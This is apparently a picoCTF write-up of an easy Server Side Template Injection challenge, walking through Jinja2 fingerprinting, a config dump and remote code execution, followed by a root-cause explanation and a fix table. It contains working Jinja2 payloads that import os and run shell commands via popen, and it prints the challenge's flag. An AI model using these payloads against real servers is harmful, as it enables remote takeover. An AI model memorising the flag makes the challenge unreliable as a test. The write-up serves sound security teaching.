# Announcements — Server Side Template Injection (SSTI)

**Category:** Web Exploitation  
**Difficulty:** Easy  
**Platform:** picoCTF — picoGym  

---

## Description

A website with an announcement input feature that was misconfigured — user input was being rendered directly as template code instead of being treated as data.

---

## Approach

### Step 1 — Identifying the Vulnerability
The challenge description mentioned "templating" — an immediate red flag for **Server Side Template Injection (SSTI)**.

Tested the input box with the classic SSTI probe:

```
{{7*7}}
```

Instead of displaying `{{7*7}}` literally, the server returned `49` — confirming that user input was being **executed by the template engine.**

### Step 2 — Fingerprinting the Template Engine
Different template engines behave differently. To confirm this was **Jinja2** specifically:

```
{{7*'7'}}
```

Output: `7777777`

Jinja2 multiplies a string by an integer — returning `7777777`. This confirmed the backend was using **Python + Jinja2**, which meant full Python object access was possible.

### Step 3 — Dumping Config
Ran `{{config}}` to extract the Flask application configuration:

```
<Config {'DEBUG': False, 'SECRET_KEY': None, ...}>
```

Confirmed Flask app with no SECRET_KEY set — poor security, but the flag wasn't here.

### Step 4 — Remote Code Execution
Using Jinja2's ability to traverse Python's object hierarchy, executed OS commands directly on the server:

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```

Output showed a file called `flag` in the current directory.

Then ran:

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

Flag retrieved! 🎯

---

## Flag

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_dcdca99a}
```

---

## Root Cause

User input was passed directly into the template engine and rendered as code instead of data. The vulnerable pattern looks like:

```python
# VULNERABLE ❌
template = Template(user_input)
result = template.render()

# SAFE ✅
template = Template("Announcement: {{ message }}")
result = template.render(message=user_input)
```

This maps to **OWASP A03 — Injection**.

---

## How to Fix

| Fix | Why |
|-----|-----|
| Never render user input as a template | Treats input as code — critical vulnerability |
| Pass user input as a variable instead | Input stays as data, never executed |
| Use Jinja2's autoescaping | Prevents malicious template syntax |
| Validate and sanitize all input | Block `{{`, `}}`, `__` patterns |

---

## Lesson Learned

> The same principle that prevents SQL injection applies here — **user input should always be DATA, never CODE.** Whether it's SQL queries, template engines, or OS commands — never let user input get executed directly.

SSTI can escalate to full Remote Code Execution, giving an attacker complete control over the server.
